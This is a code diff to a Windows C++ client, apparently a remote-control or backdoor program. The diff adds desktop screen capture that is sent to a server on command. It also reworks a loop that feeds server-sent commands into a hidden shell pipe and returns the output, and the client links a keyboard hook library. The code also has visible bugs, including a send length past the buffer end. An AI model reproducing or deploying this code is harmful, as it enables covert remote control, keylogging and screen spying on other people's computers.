@@ -6,7 +6,6 @@
 #include<iostream>
 #include<WinSock2.h>
 #include<Windows.h>
-#include<thread>
 #pragma comment(lib,"ws2_32.lib")
 #include"DATA.h"
 #pragma comment(lib,"C:/Users/19100/Desktop/Remote/bin/HOOK.lib")
@@ -14,6 +13,15 @@ using namespace std;
 int mykeyboardhook(HWND hwnd);
 
 #define MAX_LOADSTRING 100
+#pragma pack(push)
+#pragma pack(1)
+struct screendata
+{
+    unsigned int width; //屏幕宽
+    unsigned int height;    //屏幕高
+    char data[];
+};
+#pragma pack(pop)
 
 // 全局变量:
 HINSTANCE hInst;                                // 当前实例
@@ -31,49 +39,175 @@ HANDLE myhreadpipe;
 
 SOCKET s;
 
+bool sendcapture(SOCKET s)
+{
+    HWND hdesktop = NULL;
+    HDC hdesktopdc = NULL;
+    HDC hdc = NULL;
+    HBITMAP hbitmap = NULL;
+    char* pbitmapbuf = NULL;
+    int desktopwidth = 0;
+    int desktopheight = 0;
+    bool result = true;
+
+    try
+    {
+        //过去桌面窗口句柄
+        hdesktop = GetDesktopWindow();
+
+        //获取桌面DC
+        hdesktopdc = GetDC(hdesktop);
+        if (hdesktop == NULL)
+        {
+            throw "error";
+        }
+
+        //创建DC
+        hdc = CreateCompatibleDC(hdesktopdc);
+
+
+        //创建与桌面相兼容的位图
+        desktopwidth = GetSystemMetrics(SM_CXFULLSCREEN);
+        desktopheight = GetSystemMetrics(SM_CYFULLSCREEN);
+
+        hbitmap = CreateCompatibleBitmap(hdesktopdc, desktopwidth, desktopheight);
+
+        if (hbitmap == NULL)
+        {
+            throw "error";
+        }
+
+        //将创建的DC与位图关联
+        SelectObject(hdc, hbitmap);
+
+        //桌面DC数据拷贝给创建的DC
+        bool ret = BitBlt(
+            hdc,
+            0,
+            0,
+            desktopwidth,
+            desktopheight,
+            hdesktopdc,
+            0,
+            0,
+            SRCCOPY
+            );
+        if (!ret)
+        {
+            throw "error";
+        }
+
+        //从内存DC中获取位图
+        int bufsize = desktopwidth * desktopheight * 4+8;
+        //多加八个字节方便服务端接受获取宽高
+        pbitmapbuf = new char[bufsize];
+        if (pbitmapbuf == NULL)
+        {
+            throw "error";
+        }
+
+        screendata* pscreendata = (screendata*)pbitmapbuf;
+        pscreendata->width = desktopwidth;
+        pscreendata->height = desktopheight;
+
+        LONG reallybitsize = GetBitmapBits(hbitmap, bufsize-8, pbitmapbuf+8);
+        if (reallybitsize == 0)
+        {
+            throw "error";
+        }
+
+        //向服务端发送SCREEN数据
+        senddata(s, CLIENT_SCREEN_BACK, (char*)pscreendata, bufsize+8);
+
+
+    }
+
+
+    catch (...)
+    {
+        result = false;
+    }
+
+    if (hdesktopdc != NULL)
+    {
+        ReleaseDC(hdesktop, hdesktopdc);
+    }
+    if (hdc != NULL)
+    {
+        DeleteDC(hdc);
+    }
+    if (hbitmap != NULL)
+    {
+        DeleteObject(hbitmap);
+    }
+    if (pbitmapbuf != NULL)
+    {
+        delete[] pbitmapbuf;
+    }
+
+    return result;
+}
 
 DWORD WINAPI recvandsendthread(LPVOID lparam)
 {
-    int getdate;
+    bool bret;
+    char* pdata;
     while (true)
     {
-        char rbuf[30] = { 0 };
+        /*char rbuf[30] = { 0 };
         getdate = recv(s, rbuf, sizeof(unsigned int)*2, 0);
-        DATA* drbuf = (DATA*)rbuf;
-        if (getdate > 0 && (drbuf->type == SEVER_CMD_COMMAND))
+        DATA* drbuf = (DATA*)rbuf;*/
+
+        //收取头部数据
+        DATA drbuf;
+        bret = recvdata(s, (char*)&drbuf, sizeof(unsigned int) * 2);
+        if (!bret) return 0;
+        
+        //后面有数据继续收取
+        if (drbuf.length >= 0)
         {
+            pdata = new char[drbuf.length + 5];
+            if (pdata == NULL) return 0;
 
-            char rdata[260] = {0};
-            recv(s, rdata, drbuf->length, 0);
-            DWORD realwlength;
-            DWORD wlength = strlen(rdata);
-            rdata[wlength++] = '\n';
-            WriteFile(myhwritepipe, rdata, wlength, &realwlength, NULL);
+            recvdata(s, pdata, drbuf.length);
 
-
-            while (TRUE)
+            if (drbuf.type == SEVER_CMD_COMMAND)
             {
-                Sleep(100);
-                DWORD isnull = 0;
-                ret = PeekNamedPipe(myhreadpipe, 0, 1, &isnull, 0, 0);
-                if (!isnull)  break;
 
-                char backdata[300] = { 0 };
-                DWORD realrlength;
-                ReadFile(myhreadpipe, backdata, 255, &realrlength, NULL);
-                char size[300] = { 0 };
-                DATA *cmdback = (DATA*)size;
-                cmdback->length = strlen(backdata) + 1;
-                cmdback->type = CLIENT_CMD_BACK;
-                memcpy(cmdback->reallydata, backdata, cmdback->length);
-                send(s, (char*)cmdback, cmdback->length+sizeof(unsigned int)*2, 0);
+                DWORD realwlength;
+                DWORD wlength = strlen(pdata);
+                pdata[wlength++] = '\n';
+                WriteFile(myhwritepipe, pdata, wlength, &realwlength, NULL);
 
+
+                while (TRUE)
+                {
+                    Sleep(100);
+                    DWORD isnull = 0;
+                    ret = PeekNamedPipe(myhreadpipe, 0, 1, &isnull, 0, 0);
+                    if (!isnull)  break;
+
+                    char backdata[300] = { 0 };
+                    DWORD realrlength;
+                    ReadFile(myhreadpipe, backdata, 255, &realrlength, NULL);
+                    char size[300] = { 0 };
+                    DATA* cmdback = (DATA*)size;
+                    cmdback->length = strlen(backdata) + 1;
+                    cmdback->type = CLIENT_CMD_BACK;
+                    memcpy(cmdback->reallydata, backdata, cmdback->length);
+                    send(s, (char*)cmdback, cmdback->length + sizeof(unsigned int) * 2, 0);
+
+                }
             }
+
+            else if (drbuf.type == SERVER_SCREEN_COMMAND)
+            {
+                sendcapture(s);
+            }
+
         }
-        else
-        {
-            break;
-        }
+        if (pdata != NULL) delete [] pdata;
+        
     }
 
     //while (true)
@@ -388,6 +522,8 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
             PAINTSTRUCT ps;
             HDC hdc = BeginPaint(hWnd, &ps);
             // TODO: 在此处添加使用 hdc 的任何绘图代码...
+
+
             EndPaint(hWnd, &ps);
         }
         break;
